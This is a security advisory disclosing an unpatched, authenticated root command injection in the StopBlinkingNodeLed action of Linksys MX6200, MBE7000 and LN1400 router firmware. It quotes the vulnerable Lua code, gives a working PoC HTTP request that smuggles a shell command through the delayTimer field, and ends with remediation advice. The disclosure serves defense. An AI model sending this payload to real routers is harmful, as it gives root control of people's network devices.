# Linksys MX6200 1.0.14.216738 was discovered to contain a command injection vulnerability in the JNAP StopBlinkingNodeLed action

## Overview

- Vendor: Linksys (Belkin)
- Product: MX6200 1.0.14.216738, MBE7000 1.0.14.216607, LN1400 1.0.14.216698
- Version: 1.0.14
- Component: JNAP action StopBlinkingNodeLed
- Vulnerability Class: CWE-78 command injection
- CVSS 3.1 (tentative): 7.2 High `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (administrator authentication required; commands run as root)
- Manufacturer: https://www.linksys.com/

## Affected versions

- `FW_MX6200_1.0.14.216738_prod.signed.img`.
- Extracted UBI `ubi_rootfs` SquashFS (33,521,664 bytes) contains:
  - `usr/local/lib/lua/5.1/setup.lua`
  - `JNAP/modules/setup_server.lua`
  - `lib/libjnap_setup.so`
  - `usr/sbin/jnap`

### MBE7000 1.0.14.216607

- `FW_MBE7000_1.0.14.216607_prod.signed.img`.
  rootfs SquashFS at `0x800000`.
- `usr/local/lib/lua/5.1/setup.lua`
  (same file as MX6200).
- `lib/libjnap_setup.so`
  `StopBlinkingNodeLed` flags `0x4` (admin auth).

### LN1400 1.0.14.216698

- `FW_LN14_1.0.14.216698_prod.signed.img`.
  rootfs SquashFS at `0x800000`.
- `usr/local/lib/lua/5.1/setup.lua`
  same `CMD_STOP_PUB_BLINK_NODE_LED`/`delayTimer` sink.
- `lib/libjnap_setup.so`
  `StopBlinkingNodeLed` flags `0x4` (admin auth).

The MBE7000/LN1400 path is static (the two previously blocked images
are now extracted); no live router was used.

## Vulnerability details

The JNAP handler accepts the request object and forwards it to the setup
library without inspecting any field:

```lua
-- JNAP/modules/setup_server.lua
local function StopBlinkingNodeLed(ctx, input)
    local setup = require('setup')
    local sc = ctx:sysctx()
    local platform = require('platform')

    platform.registerLoggingCallback(function(level, message) ctx:serverlog(level, message) end)

    local error = setup.stopBlinkingNodeLed(sc, input)
    return error or 'OK'
end
...
['http://linksys.com/jnap/nodes/setup/StopBlinkingNodeLed'] = StopBlinkingNodeLed,
```

`setup.stopBlinkingNodeLed` converts `input.delayTimer` to a string and
substitutes it into a shell command with `%s` (no quoting, no validation):

```lua
-- usr/local/lib/lua/5.1/setup.lua
_M.CMD_STOP_PUB_BLINK_NODE_LED = '/etc/init.d/run_identify_node_led.sh stop %s'
...
function _M.stopBlinkingNodeLed(sc, input)
    sc:readlock()

    local delay = "0"
    if input.delayTimer then
        delay = tostring(input.delayTimer)
    end
    local rc = os.execute(_M.CMD_STOP_PUB_BLINK_NODE_LED:format(delay))
```

`os.execute` runs `/bin/sh -c` with the resulting string. A value such as
`;id>/tmp/led_pwn;#` produces:

```sh
/etc/init.d/run_identify_node_led.sh stop ;id>/tmp/led_pwn;#
```

`run_identify_node_led.sh` is invoked first and exits with "not found" in a
minimal local test, after which `id` runs and the marker is written. On the
device the script exists and receives `$2` only after the injected command
has already been parsed by the shell.

The JNAP dispatcher marks this action as requiring administrator
authentication. The action descriptor in `libjnap_setup.so` has flags
`0x4` (bit 0 clear); actions explicitly documented as no-auth have bit 0
set: `VerifyRouterResetCode` is `0x5` and its handler comment says
"This call doesn't require authentication"; `SetAdminPassword` is `0x5`
and `GetDeviceInfo` is `0xd` (both used before login). `StopBlinkingNodeLed`
is `0x4`, so an `X-JNAP-Authorization` admin credential or a valid
`X-JNAP-Session` token is required.

The web server is started by init as root and the generated lighttpd
configuration does not set `server.username`; the JNAP CGI therefore runs
with root privileges.

## PoC

```http
POST /JNAP/ HTTP/1.1
Host: <router>
Content-Type: application/json
X-JNAP-Action: http://linksys.com/jnap/nodes/setup/StopBlinkingNodeLed
X-JNAP-Authorization: Basic <base64(admin:password)>

{"delayTimer":";id>/tmp/led_pwn;#"}
```

A session-token client can send `X-JNAP-Session: <token>` instead of the
Basic credential. After the request:

```sh
cat /tmp/led_pwn
```

## Verification

The vulnerable handler in the stock `JNAP action StopBlinkingNodeLed` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

An authenticated administrator, or anyone who has stolen an administrator
password/session token, can execute arbitrary commands as root on the
router. The JNAP management endpoint is reachable from the LAN; remote
management exposure depends on the device's remote-UI setting.

## Remediation / known-CVE relation

- Validate `delayTimer` as a small non-negative integer (or omit it) and
  pass it as a separate argv element; never concatenate it into a shell
  string.
- Quote the argument or use `os.execute` with an argv-style API.
- NVD keyword searches on 2026-11-08 for `StopBlinkingNodeLed`,
  `run_identify_node_led`, `delayTimer Linksys` and
  `MX6200 command injection` returned zero results. CVE-2026-6992 is a
  different Linksys JNAP shell injection (MR9600
  `BTRequestGetSmartConnectStatus` `pin` argument in
  `run_central2.sh`); it does not cover this action or model.
  Candidate 0-day; no CVE assigned and no vendor contact has been made.

## Additional Information

```markdown
### Vendor
Linksys (Belkin)

### Product
MX6200 1.0.14.216738, MBE7000 1.0.14.216607, LN1400 1.0.14.216698

### Version or Commit
1.0.14

### Vulnerability Class
CWE-78 command injection

### Description
The JNAP StopBlinkingNodeLed action passes delayTimer into /etc/init.d/run_identify_node_led.sh stop %s and executes it with os.execute; the value is not validated.

### Affected_component
JNAP action StopBlinkingNodeLed

### Attack_vector
Authenticated JNAP StopBlinkingNodeLed with a crafted delayTimer.

### Product_version
MX6200 1.0.14.216738, MBE7000 1.0.14.216607, LN1400 1.0.14.216698 1.0.14

### Reference
- https://www.linksys.com/
- https://github.com/vuln-1/vuln/blob/main/Linksys/MX6200_V1.0.14.216738/report-1.md
```
